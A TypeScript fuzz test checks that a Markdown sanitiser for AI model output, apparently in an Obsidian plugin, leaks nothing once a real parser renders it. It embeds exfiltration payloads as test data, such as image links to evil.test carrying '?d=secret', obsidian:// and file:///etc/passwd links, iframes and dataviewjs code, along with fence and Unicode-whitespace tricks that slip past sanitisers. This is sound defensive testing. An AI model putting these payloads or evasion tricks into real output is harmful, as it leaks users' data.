import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { Window } from "happy-dom";
import { marked } from "marked";
import { validateMermaidSource } from "../src/safety/mermaidGuard";
import { PLAIN_CODE_LANGUAGES, sanitizeModelMarkdown } from "../src/safety/sanitize";
import { prepareModelOutputForWrite } from "../src/safety/writePath";

/**
 * Differential test. The sanitiser reads the Markdown with its own scanners; a real Markdown parser (marked) is the
 * oracle. Sanitised text is rendered and the resulting DOM is searched for anything that loads a resource, links to
 * another app, runs a code-block processor or defeats the Mermaid guard. A leak means the sanitiser's idea of the
 * document structure differed from the parser's: it treated text as code (typically through a fence opener or closer
 * it misjudged, or an HTML block, list or comment it ended in a different place), so what it left alone was rendered.
 *
 * marked is not CommonMark to the letter, and neither is Obsidian's parser, so a document where the two disagree is a
 * reason to fail closed rather than a false alarm: the sanitiser leaves a fence unprotected whenever the structure
 * before it could be read two ways, and whenever a line inside it, or its own closing line, is a closer for one parser
 * and not for the other (marked takes "```~" and does not take a tab after the run, CommonMark the reverse). The
 * generators therefore also emit closers with fence characters and tabs after the run, and task list prefixes, which
 * marked reads as the start of the item's own content. A second pair of generators adds the white space that
 * JavaScript calls white space and the parsers do not (no-break and ideographic spaces, form feeds, byte order marks)
 * before fences, behind list and quote markers and on lines of their own, and the line and paragraph separators in
 * and after the info string.
 *
 * ASKMATE_FUZZ_DOCUMENTS sets how many generated documents each property checks (4,000 by default; a million takes
 * about a minute and is worth running after changing the scanners).
 */

const window = new Window({
	settings: {
		disableJavaScriptEvaluation: true,
		disableJavaScriptFileLoading: true,
		disableCSSFileLoading: true,
		disableIframePageLoading: true,
		disableComputedStyleRendering: true,
		disableErrorCapturing: true
	}
});

const RESOURCE_ATTRIBUTES = ["src", "srcset", "poster", "data", "background", "codebase", "lowsrc", "dynsrc", "action", "formaction", "ping", "xlink:href"];
const NEVER_RENDERED_ELEMENTS = ["iframe", "frame", "frameset", "video", "audio", "source", "embed", "object", "applet", "picture", "link", "style", "track", "svg", "base", "meta", "script", "portal", "bgsound", "form"];
// What a URL parser drops before it reads the scheme: controls, spaces, zero-width and bidirectional characters.
const IGNORED_IN_URLS = /[\u0000-\u0020\u007f-\u009f\u200b-\u200f\u2028-\u202e\u2060-\u206f\ufeff]/g;

function schemeOf(value: string): string | null {
	const cleaned = value.replace(IGNORED_IN_URLS, "");
	const match = /^([A-Za-z][A-Za-z0-9+.-]*):/.exec(cleaned);
	if (match) {
		return match[1].toLowerCase();
	}
	return /^(?:\/\/|\\\\|\/\\|\\\/)/.test(cleaned) ? "//" : null;
}

function isLoadableRemotely(value: string): boolean {
	const scheme = schemeOf(value);
	if (scheme === null) {
		return false;
	}
	return !(scheme === "data" && /^data:image\//i.test(value.trim()));
}

/** What a Markdown parser makes of the text, reduced to the things that must never come out of sanitised model output. */
function findLeaks(markdown: string): string[] {
	const html = marked.parse(markdown, { async: false, gfm: true });
	window.document.body.innerHTML = html;
	const leaks: string[] = [];
	const body = window.document.body;

	for (const element of Array.from(body.querySelectorAll("*"))) {
		const tag = element.tagName.toLowerCase();
		if (NEVER_RENDERED_ELEMENTS.includes(tag)) {
			leaks.push(`element <${tag}>`);
		}
		for (const attribute of RESOURCE_ATTRIBUTES) {
			const value = element.getAttribute(attribute);
			if (value !== null && isLoadableRemotely(value)) {
				leaks.push(`<${tag} ${attribute}="${value}">`);
			}
		}
		const style = element.getAttribute("style");
		if (style !== null && /url\s*\(|image-set|@import|\\|&#/i.test(style)) {
			leaks.push(`<${tag} style="${style}">`);
		}
		const href = element.getAttribute("href");
		if (href !== null && (tag === "a" || tag === "area")) {
			const scheme = schemeOf(href);
			if (scheme !== null && scheme !== "http" && scheme !== "https") {
				leaks.push(`<${tag} href="${href}">`);
			}
		}
	}

	for (const code of Array.from(body.querySelectorAll("code"))) {
		const text = code.textContent ?? "";
		const inFence = code.parentElement?.tagName.toLowerCase() === "pre";
		const language = /(?:^|\s)language-(\S+)/.exec(code.getAttribute("class") ?? "")?.[1]?.toLowerCase();
		if (inFence && language !== undefined) {
			if (!PLAIN_CODE_LANGUAGES.has(language)) {
				leaks.push(`fence language ${language}`);
			} else if (language === "mermaid" && text.trim() !== "" && !validateMermaidSource(text).ok) {
				leaks.push(`unsafe mermaid diagram: ${text.slice(0, 80)}`);
			}
			continue;
		}
		if (/^\s*\$?=/.test(text)) {
			leaks.push(`dataview code: ${text.slice(0, 60)}`);
		}
	}
	return leaks;
}

function mulberry32(seed: number): () => number {
	let state = seed >>> 0;
	return () => {
		state = (state + 0x6d2b79f5) >>> 0;
		let t = state;
		t = Math.imul(t ^ (t >>> 15), t | 1);
		t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
		return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
	};
}

/**
 * White space that JavaScript trims and matches with \s but that CommonMark and marked do not count as indentation or as a
 * blank line: only the space and the tab are. A scanner that trims with JavaScript's idea of white space reads a line led
 * by one of these as a fence line, which the parsers read as text.
 */
const UNICODE_WHITESPACE: ReadonlyArray<readonly [string, string]> = [
	["a no-break space", "\u00a0"],
	["an ideographic space", "\u3000"],
	["an em space", "\u2003"],
	["a narrow no-break space", "\u202f"],
	["an Ogham space mark", "\u1680"],
	["a vertical tab", "\u000b"],
	["a form feed", "\u000c"],
	["a byte order mark", "\ufeff"]
];

const HOST = "https://evil.test";
const OPENER_INFOS = ["", "js", "text", "dataviewjs", "mermaid", "math", "dataview", "tasks", "python", "meta-bind-js-view"];
const CONTAINER_PREFIXES = ["", "", "", "", " ", "  ", "   ", "    ", "\t", "> ", "- ", "* ", "1. ", "10) ", "  - ", "   - ", "    - ", ">> ", "> - ", "- > ", "- [ ] ", "- [x] ", "1. [ ] ", "> - [ ] ", "  - [ ] "];
/**
 * What may follow a closing run. Mostly nothing or spaces, but also other fence characters, which marked takes as part of
 * a closer and CommonMark does not, and tabs, which CommonMark takes and marked does not.
 */
const CLOSER_SUFFIXES = ["", "", "", "", "", "", " ", "~", "`", "~`", "``", "\t", " \t"];

/** The pieces a generated document is built from, so one generator can be run with and without the Unicode ones. */
interface Vocabulary {
	openerInfos: readonly string[];
	containerPrefixes: readonly string[];
	closerSuffixes: readonly string[];
	/** Lines of their own, which the parsers read as text although a JavaScript `trim` calls them empty. */
	blankLines: readonly string[];
	/** White space that leads a fence line (opener or closer) in some documents. Consuming none keeps a seed's document the same. */
	leads: readonly string[];
}

const ASCII_VOCABULARY: Vocabulary = {
	openerInfos: OPENER_INFOS,
	containerPrefixes: CONTAINER_PREFIXES,
	closerSuffixes: CLOSER_SUFFIXES,
	blankLines: [],
	leads: []
};

const UNICODE_LEADS = UNICODE_WHITESPACE.map(([, char]) => char);
/**
 * The same pieces plus white space that is not CommonMark white space: before a fence, behind a list or quote marker, and
 * on lines of its own; U+2028 and U+2029 in and after the info string (they are not line endings to the parsers, and a
 * regular expression `.` does not match them); and after a closing run, where they make the line a body line.
 */
const UNICODE_VOCABULARY: Vocabulary = {
	openerInfos: [...OPENER_INFOS, "js\u2028x", "mermaid\u2029x", "\u2028js", "dataviewjs\u2029", "text\u00a0x"],
	containerPrefixes: [
		...CONTAINER_PREFIXES,
		...UNICODE_LEADS,
		...UNICODE_LEADS.flatMap((lead) => [`  ${lead}`, `- ${lead}`, `> ${lead}`, `${lead} `, `- [ ] ${lead}`])
	],
	closerSuffixes: [...CLOSER_SUFFIXES, "\u2028", "\u2029", "\u00a0", "\u2028~", " \u00a0"],
	blankLines: UNICODE_LEADS,
	leads: UNICODE_LEADS
};

const PAYLOADS = [
	`![x](${HOST}/a.png?d=secret)`,
	`![x][r]`,
	`[r]: ${HOST}/r.png`,
	`[x](obsidian://new?vault=v&name=n&content=c)`,
	`[x](file:///etc/passwd)`,
	`<${HOST}/auto>`,
	`<obsidian://open?vault=v>`,
	`<img src="${HOST}/i.png">`,
	`<iframe src="${HOST}/f"></iframe>`,
	`<a href="obsidian://open?vault=v">x</a>`,
	"`$= dv.paragraph('x')`",
	"`= this.file.name`",
	`A@{ img: "${HOST}/x.png", label: "x" }`,
	`<b>x</b>`,
	`<div>`,
	`</div>`,
	`<span>`,
	`<!--`,
	`-->`,
	`<style>`,
	`</style>`,
	`%%`,
	`$$`,
	`---`,
	`...`,
	``,
	``,
	`text`,
	`# Heading`,
	`| a | b |`,
	`flowchart TD`,
	`A --> B`,
	"`![x](https://evil.test/a.png)`",
	"``a ` b ![x](https://evil.test/a.png) ``",
	"a `b ![x](https://evil.test/a.png) c` d",
	"`<img src=\"https://evil.test/i.png\">`",
	"` ![x](https://evil.test/a.png)",
	"![x](https://evil.test/a.png) `",
	"`a` ![x](https://evil.test/a.png) `b`",
	"<a href=\"`\">![x](https://evil.test/a.png)`</a>",
	"[x](`obsidian://open`) `",
	"$a ` b$ ![x](https://evil.test/a.png) `",
	"%% `![x](https://evil.test/a.png) %% `"
];

function pick<T>(items: readonly T[], next: () => number): T {
	return items[Math.floor(next() * items.length)];
}

function fenceLine(next: () => number, vocabulary: Vocabulary): string {
	const prefix = pick(vocabulary.containerPrefixes, next);
	const marker = next() < 0.65 ? "`" : "~";
	const length = 3 + Math.floor(next() * 2);
	const info = pick(vocabulary.openerInfos, next);
	if (next() < 0.45) {
		// A line that could close a fence: maybe longer than the opener, maybe followed by white space or fence characters.
		return `${prefix}${marker.repeat(length + Math.floor(next() * 2))}${pick(vocabulary.closerSuffixes, next)}`;
	}
	return `${prefix}${marker.repeat(length)}${info ? `${next() < 0.8 ? "" : " "}${info}` : ""}`;
}

function generateDocument(seed: number, vocabulary: Vocabulary = ASCII_VOCABULARY): string {
	const next = mulberry32(seed);
	const count = 3 + Math.floor(next() * 7);
	const lines: string[] = [];
	for (let index = 0; index < count; index += 1) {
		if (next() < 0.42) {
			lines.push(fenceLine(next, vocabulary));
		} else if (vocabulary.blankLines.length > 0 && next() < 0.1) {
			lines.push(pick(vocabulary.blankLines, next));
		} else {
			const prefix = next() < 0.2 ? pick(vocabulary.containerPrefixes, next) : "";
			lines.push(`${prefix}${pick(PAYLOADS, next)}`);
		}
	}
	return lines.join("\n");
}

/**
 * Documents built from blocks (paragraphs, lists with nested items, quotes, fences with bodies, HTML) joined by blank
 * lines or not. They reach structures that random lines rarely form: a fence inside the second level of a list, a
 * quote around a list, a comment that spans a blank line.
 */
function generateBlockDocument(seed: number, vocabulary: Vocabulary = ASCII_VOCABULARY): string {
	const next = mulberry32(seed);
	const body = (): string => pick(PAYLOADS, next);
	// Draws nothing when the vocabulary has no leads, so the ASCII documents of a seed do not change.
	const lead = (): string => (vocabulary.leads.length > 0 && next() < 0.2 ? pick(vocabulary.leads, next) : "");
	const fence = (indent: string): string[] => {
		const marker = next() < 0.7 ? "`" : "~";
		const length = 3 + Math.floor(next() * 2);
		const info = pick(vocabulary.openerInfos, next);
		const opening = `${indent}${lead()}${marker.repeat(length)}${info}`;
		const inner = Array.from({ length: Math.floor(next() * 4) }, () => `${indent}${body()}`);
		const closer = next() < 0.7 ? [`${indent.slice(0, Math.floor(next() * (indent.length + 1)))}${lead()}${marker.repeat(length + (next() < 0.2 ? 1 : 0))}${pick(vocabulary.closerSuffixes, next)}`] : [];
		return [opening, ...inner, ...closer];
	};
	const list = (depth: number, indent: string): string[] => {
		const rows: string[] = [];
		const items = 1 + Math.floor(next() * 3);
		for (let item = 0; item < items; item += 1) {
			const marker = pick(["-", "*", "1.", "2)"], next);
			const pad = " ".repeat(marker.length + 1);
			rows.push(`${indent}${marker} ${body()}`);
			if (next() < 0.35) {
				rows.push(...fence(`${indent}${pad}`));
			}
			if (next() < 0.4 && depth < 3) {
				rows.push(...list(depth + 1, `${indent}${pad}`));
			}
			if (next() < 0.15) {
				rows.push(body());
			}
		}
		return rows;
	};
	const block = (): string[] => {
		const kind = next();
		if (kind < 0.25) {
			return Array.from({ length: 1 + Math.floor(next() * 3) }, body);
		}
		if (kind < 0.5) {
			return list(0, pick(["", "", " ", "  "], next));
		}
		if (kind < 0.62) {
			return [...(next() < 0.5 ? [`> ${body()}`] : []), ...fence("> ")];
		}
		if (kind < 0.9) {
			return fence(pick(["", "", " ", "  ", "   "], next));
		}
		return [pick(["<div>", "<!--", "<b>x</b>", "<style>", "<span>", "---"], next), ...Array.from({ length: Math.floor(next() * 3) }, body)];
	};
	const out: string[] = [];
	const count = 1 + Math.floor(next() * 4);
	for (let index = 0; index < count; index += 1) {
		out.push(...block());
		const gap = next();
		if (gap < 0.6) {
			out.push(vocabulary.blankLines.length > 0 && next() < 0.25 ? pick(vocabulary.blankLines, next) : "");
		} else if (gap < 0.65) {
			out.push("", "");
		}
	}
	return out.join("\n");
}

const DOCUMENT_COUNT = Number(process.env.ASKMATE_FUZZ_DOCUMENTS ?? 4000);
/** Where the seeds start, to replay one failing document: ASKMATE_FUZZ_FIRST=<seed> ASKMATE_FUZZ_DOCUMENTS=1. */
const FIRST_SEED = Number(process.env.ASKMATE_FUZZ_FIRST ?? 1);
const LONG_RUN_TIMEOUT = 15 * 60 * 1000;

describe("sanitiser against a Markdown oracle: known repros", () => {
	interface Repro {
		name: string;
		markdown: string;
		/** True when the oracle must see a live construct in the text as written, which proves the repro is a real one. */
		live: boolean;
	}

	const repros: Repro[] = [
		{ name: "A: a fence opener indented one space, closer at column zero", markdown: " ```js\nok\n```\n\n![x](https://evil.test/a.png?d=secret)", live: true },
		{ name: "A: the same prefix hides a dataviewjs fence", markdown: " ```js\nok\n```\n\n```dataviewjs\ndv.paragraph(app.vault.getName())\n```", live: true },
		{ name: "A: the same prefix hides an obsidian link", markdown: " ```js\nok\n```\n\n[x](obsidian://new?vault=v&name=n&content=c)", live: true },
		{ name: "A: the same prefix hides a Mermaid image shape", markdown: " ```js\nok\n```\n\n```mermaid\nflowchart TD\nA@{ img: \"https://evil.test/x.png\" }\n```", live: true },
		{ name: "B: an inline tag line puts the sanitiser in an HTML block", markdown: "<b>x</b>\n```\n\n```\n![x](https://evil.test/a.png?d=secret)", live: true },
		{ name: "C: escaping the first line changes which fence is real", markdown: "<img src=\"https://evil.test/x\">\n~~~\n\n~~~\n<img src=\"https://evil.test/y\">", live: true },
		{ name: "three-space opener, closer at column zero", markdown: "   ~~~\ncode\n~~~\n![x](https://evil.test/a.png)", live: true },
		{ name: "quoted opener, closer at column zero", markdown: "> ```\n> code\n```\n![x](https://evil.test/a.png)", live: false },
		{ name: "a fence in an inner list item hides the outer item's fence", markdown: "- ````x\n  ````\n  - ![x](https://evil.test/a.png?d=secret)\n  ```text\n\n![x](https://evil.test/a.png?d=secret)", live: true },
		{ name: "a fence indented into an outer item after a nested item", markdown: "- A --> B\n  - A@{ img: \"https://evil.test/x.png\", label: \"x\" }\nflowchart TD\n  ~~~~\n-->\n-->\n<iframe src=\"https://evil.test/f\"></iframe>\n- ````", live: true },
		{ name: "text that follows a list item without a blank line", markdown: "- ```\n    ````\n![x](https://evil.test/a.png?d=secret)\n-->\n   ~~~~~\n<style>\n...\n> - \n...", live: true },
		{ name: "an HTML block that opens before frontmatter ends", markdown: "---\n<div>\n...\n   ```` python\n- > </div>\n- > ~~~ \n- ``` text\n<a href=\"obsidian://open?vault=v\">x</a>", live: true },
		{ name: "a comment that starts in a list item", markdown: "   - <!--\n<span>\n-->\n- flowchart TD\n````` \n    ````\n<style>\n   - ~~~~\n$$", live: true },
		{ name: "a comment that interrupts a paragraph", markdown: "`= this.file.name`\n<!--\n---\n<span>\ntext\n$$\n-->\n~~~ text\n<iframe src=\"https://evil.test/f\"></iframe>", live: true },
		{ name: "a comment that runs past a blank line inside an HTML block", markdown: ">> <b>x</b>\n<!--\n   \n~~~~ \n> - `````\n-->\n<style>", live: true },
		{ name: "a style block whose end line comes after a comment", markdown: "<style>\n<!--\n</style>\n````mermaid\nA --> B\n<style>\n[r]: https://evil.test/r.png\n flowchart TD\n   <img src=\"https://evil.test/i.png\">", live: true },
		{ name: "a list marker inside a diagram is content, not a marker", markdown: "<b>x</b>\n    ```\n-->\n- ````mermaid\n    - flowchart TD\n%%\n# Heading", live: true },
		{ name: "a diagram whose fence the scanner does not see is judged as written", markdown: "   <b>x</b>\n- ````dataview\n<span>\n```dataviewjs\n   - ````\n<a href=\"obsidian://open?vault=v\">x</a>\n\n~~~~mermaid\n- > flowchart TD", live: true },
		{ name: "D: a closer followed by a mixed fence character ends the fence for marked only", markdown: "```js\ncode\n```~\n\n![x](https://evil.test/a.png?d=secret)\n", live: true },
		{ name: "D: the same hides a dataviewjs fence", markdown: "```js\ncode\n```~\n\n```dataviewjs\ndv.paragraph(app.vault.getName())\n```\n", live: true },
		{ name: "D: a tilde fence closed by a tilde run and a backtick hides an obsidian link", markdown: "~~~js\ncode\n~~~`\n\n[x](obsidian://new?vault=v&name=n&content=c)\n", live: true },
		{ name: "D: a longer closer with both characters after the run", markdown: "````js\ncode\n````~`\n\n![x](https://evil.test/a.png?d=secret)\n", live: true },
		{ name: "E: a closer followed by a tab closes the fence for CommonMark only", markdown: "```js\ncode\n```\t\n```\n![x](https://evil.test/a.png?d=secret)", live: true },
		{ name: "E: a diagram closed by a tab line carries on for marked", markdown: "```mermaid\nflowchart TD\n  A-->B\n```\t\nA@{ img: \"https://evil.test/x.png\" }\n```", live: true },
		{ name: "F: a task list item whose text is a fence opener", markdown: "- [ ] ```dataviewjs\n  dv.paragraph(app.vault.getName())\n  ```\n", live: true },
		{ name: "F: an ordered task item with a diagram that draws an image", markdown: "1. [x] ```mermaid\n   flowchart TD\n   A@{ img: \"https://evil.test/x.png\" }\n   ```\n", live: true },
		{ name: "G: an opener indented with a no-break space is text, so the image after it is live", markdown: "\u00a0```js\n![x](https://evil.test/a.png?d=secret)\n", live: true },
		{ name: "G: the same prefix hides a dataviewjs fence", markdown: "\u00a0```js\n```dataviewjs\ndv.paragraph(app.vault.getName())\n````\n", live: true },
		{ name: "G: a closer indented with a no-break space is code, which flips every later fence", markdown: "```js\ncode\n\u00a0```\ntext\n```\n![x](https://evil.test/a.png?d=secret)\n", live: true },
		{ name: "G: a line separator in the info string does not hide the opener", markdown: "```js\u2028x\ncode\n```\n![x](https://evil.test/a.png?d=secret)\n", live: true },
		{ name: "G: a paragraph separator in the info string does not hide the opener", markdown: "~~~js\u2029x\ncode\n~~~\n![x](https://evil.test/a.png?d=secret)\n", live: true },
		{ name: "I: a list item's fence ends with its container, and the tab-closed line after it does not close it for marked", markdown: "- \n  ````mermaid\n  flowchart TD\n ````` \t\nA@{ img: \"https://evil.test/x.png\" }\n", live: true },
		{ name: "I: the same with a closing line that marked takes and CommonMark does not", markdown: "- \n  ````mermaid\n  flowchart TD\n ````~\nA@{ img: \"https://evil.test/x.png\" }\n", live: false },
		{ name: "G: a separator after a mermaid label hides a diagram that draws an image", markdown: "```mermaid\u2028x\nflowchart TD\nA@{ img: \"https://evil.test/x.png\" }\n```\n", live: true },
		...UNICODE_WHITESPACE.flatMap(([label, char]): Repro[] => [
			{ name: `H: an opener led by ${label} is text`, markdown: `${char}\`\`\`js\n![x](https://evil.test/a.png?d=secret)\n`, live: true },
			{ name: `H: a closer led by ${label} is code`, markdown: `\`\`\`js\ncode\n${char}\`\`\`\ntext\n\`\`\`\n![x](https://evil.test/a.png?d=secret)\n`, live: true },
			{ name: `H: a quoted opener led by ${label}`, markdown: `> ${char}\`\`\`js\n> ![x](https://evil.test/a.png?d=secret)\n`, live: true },
			{ name: `H: a list item whose fence opener is led by ${label}`, markdown: `- ${char}\`\`\`js\n  ![x](https://evil.test/a.png?d=secret)\n`, live: true },
			{ name: `J: a line of ${label} is blank to marked, so the list item runs on over it`, markdown: `* a\n\n${char}\n   \`\`\`js\n> \`= this.file.name\`\n`, live: true },
			{ name: `J: a line of ${label} inside a list item's fence does not end it for marked`, markdown: `* a\n  \`\`\`js\n  code\n${char}\n  \`\`\`\n![x](https://evil.test/a.png?d=secret)\n`, live: true }
		])
	];

	for (const repro of repros) {
		test(repro.name, () => {
			if (repro.live) {
				expect(findLeaks(repro.markdown).length).toBeGreaterThan(0);
			}
			const once = sanitizeModelMarkdown(repro.markdown);
			expect(findLeaks(once)).toEqual([]);
			expect(sanitizeModelMarkdown(once)).toBe(once);
			expect(findLeaks(prepareModelOutputForWrite(repro.markdown).text)).toEqual([]);
		});
	}

	test("code in a fence that follows a blank line is left exactly as written", () => {
		const text = "Intro\n\n```html\n<img src=\"https://example.com/logo.png\">\n```\n\n```md\n![x](https://example.com/a.png)\n```\n";
		expect(sanitizeModelMarkdown(text)).toBe(text);
	});
});

describe("sanitiser against a Markdown oracle: generated documents", () => {
	const generators: Record<string, (seed: number) => string> = {
		lines: (seed) => generateDocument(seed),
		blocks: (seed) => generateBlockDocument(seed),
		"unicode lines": (seed) => generateDocument(seed, UNICODE_VOCABULARY),
		"unicode blocks": (seed) => generateBlockDocument(seed, UNICODE_VOCABULARY)
	};

	function check(kind: string, label: string, multiplier: number, offset: number, run: (document: string) => string): void {
		const generate = generators[kind];
		const failures: Array<{ seed: number; document: string; leaks: string[] }> = [];
		for (let seed = FIRST_SEED; seed < FIRST_SEED + DOCUMENT_COUNT && failures.length < 6; seed += 1) {
			const document = generate(seed * multiplier + offset);
			const leaks = findLeaks(run(document));
			if (leaks.length > 0) {
				failures.push({ seed, document: JSON.stringify(document), leaks });
			}
		}
		expect({ label, failures }).toEqual({ label, failures: [] });
	}

	const source = "```dataviewjs\ndv.paragraph('mine')\n```\n\n<style>.a { color: red }</style>\n\n![x](https://cdn.example.com/a.png)";

	for (const kind of Object.keys(generators)) {
		test(`${kind}: documents leak nothing through the render path`, () => {
			check(kind, "render", 1, 0, (document) => sanitizeModelMarkdown(document));
		}, LONG_RUN_TIMEOUT);

		test(`${kind}: the write path is as strict as the render path`, () => {
			check(kind, "write", 7, 3, (document) => prepareModelOutputForWrite(document).text);
		}, LONG_RUN_TIMEOUT);

		test(`${kind}: the write path is as strict when the source text held other constructs`, () => {
			check(kind, "write with source", 11, 5, (document) => prepareModelOutputForWrite(document, { sourceText: source }).text);
		}, LONG_RUN_TIMEOUT);

		test(`${kind}: a second pass changes nothing`, () => {
			const failures: Array<{ seed: number; document: string }> = [];
			for (let seed = FIRST_SEED; seed < FIRST_SEED + DOCUMENT_COUNT && failures.length < 6; seed += 1) {
				const document = generators[kind](seed * 13 + 5);
				const once = sanitizeModelMarkdown(document);
				if (sanitizeModelMarkdown(once) !== once) {
					failures.push({ seed, document: JSON.stringify(document) });
				}
			}
			expect(failures).toEqual([]);
		}, LONG_RUN_TIMEOUT);
	}
});

describe("sanitiser against a Markdown oracle: real documents", () => {
	test("the repository's own Markdown leaks nothing once sanitised", () => {
		for (const file of ["README.md", "CONTRIBUTING.md", "SECURITY.md", "rules.md", "docs/investigations/composer-scroll-moves-extension-2026-05-12.md"]) {
			const text = readFileSync(new URL(`../${file}`, import.meta.url), "utf8");
			expect({ file, leaks: findLeaks(sanitizeModelMarkdown(text)) }).toEqual({ file, leaks: [] });
			expect({ file, leaks: findLeaks(prepareModelOutputForWrite(text).text) }).toEqual({ file, leaks: [] });
		}
	});

	test("the oracle sees plain content as clean", () => {
		const clean = "# Title\n\n```ts\nconst x = 1;\n```\n\n[docs](https://example.com) and [note](Notes/a.md)\n\n![local](images/a.png)\n";
		expect(findLeaks(clean)).toEqual([]);
		expect(sanitizeModelMarkdown(clean)).toBe(clean);
	});
});
